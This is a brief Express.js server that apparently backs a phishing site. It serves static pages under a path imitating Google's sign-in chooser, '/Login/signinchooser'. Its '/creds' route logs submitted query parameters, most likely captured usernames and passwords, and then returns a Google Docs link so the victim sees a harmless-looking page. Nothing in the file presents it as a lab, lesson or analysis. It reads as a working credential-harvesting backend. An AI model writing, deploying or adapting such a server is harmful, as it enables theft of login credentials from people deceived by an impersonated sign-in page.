let express = require('express');
let app = express();
let PORT = process.env.PORT || 8080;

app.get('/creds', (req, res) => {
  console.log(req.query);
  res.status(200).send('https://docs.google.com/document/d/1mSmZYXcdyMWlpWTCY5bUAdkVgx0JxE2mFaGXtqPpQU4/edit');
});

app.use('/', express.static('static'))
app.use('/Login/signinchooser', express.static('static'))

app.listen(PORT, () => {
	console.log('Server live on port ' + PORT);
})

